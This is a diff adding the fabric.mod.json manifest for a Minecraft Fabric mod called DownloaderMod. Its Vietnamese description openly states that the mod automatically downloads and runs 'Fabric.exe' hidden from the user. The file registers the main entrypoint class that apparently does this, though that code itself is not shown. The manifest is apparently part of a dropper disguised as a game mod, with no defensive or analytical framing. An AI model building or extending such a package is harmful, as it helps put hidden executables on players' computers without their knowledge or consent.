@@ -1,0 +1,14 @@
+{
+  "schemaVersion": 1,
+  "id": "downloadermod",
+  "version": "1.0.0",
+  "name": "DownloaderMod",
+  "description": "Mod tự động tải và chạy Fabric.exe (ẩn)",
+  "entrypoints": {
+    "main": ["com.example.downloadermod.DownloaderMod"]
+  },
+  "depends": {
+    "fabricloader": ">=0.14.0",
+    "minecraft": ">=1.21 <=1.21.8"
+  }
+}
